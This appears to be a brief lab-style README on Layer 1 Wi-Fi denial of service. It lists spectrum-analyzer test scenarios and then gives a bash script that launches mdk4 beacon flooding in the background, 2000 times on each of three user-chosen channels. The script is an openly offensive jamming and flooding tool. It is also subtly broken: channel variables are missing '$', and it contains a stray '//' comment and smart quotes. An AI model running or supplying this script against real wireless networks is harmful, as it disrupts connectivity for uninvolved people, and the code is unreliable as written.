# Layer 1 DOS

Layer 1 Denial of Service (DoS) assault by examining spectrum behaviour as well as a look at the assault utilizing scripting.

By ensuring the presence of the USB Wi-Fi adapter and the spectrum analyzer, we can conduct the test and observe the presence of high frequency signals across all channels. Additionally, we can detect the fluctuation of the wave in both the spectrum analyzer device and the software.

## Scenarios

Scenario 1:
By utilizing the spectrum analyzer, we can assess the frequency range of a channel and determine the level of traffic present within that particular channel.

Scenario 2:
Using the Spectrum Analyzer, we can use this test the company WLANs and test the server in order to provide a secure network.

Scenario 3:
By utilizing the spectrum analyzer, we can detect and identify unauthorized devices that are employed for the purpose of analyzing potentially illicit behaviour within a specific frequency range. This information may then be leveraged to implement measures that prevent these devices from accessing and utilizing the network.

Scenario 4:
Additionally, it was utilized to assess the areas with no signal reception and the extent of signal coverage on the specific channel.

## Script - simultaneously attacks channel 1,6,11:

#! /bin/bash
read -p “Enter interface (monitor mode) you wise to use for the attack:” interface
read -p “Enter channel you wish to attack:” channel1
read -p “Enter channel you wish to attack:” channel2
read -p “Enter channel you wish to attack:” channel3
iwconfig $interface channel $channel1 // this is additional
for count in $(seq 1 2000)
do
(mdk4 $interface b -c channel1> /dev/null)&
(mdk4 $interface b -c channel2> /dev/null)&
(mdk4 $interface b -c channel3> /dev/null)&
done
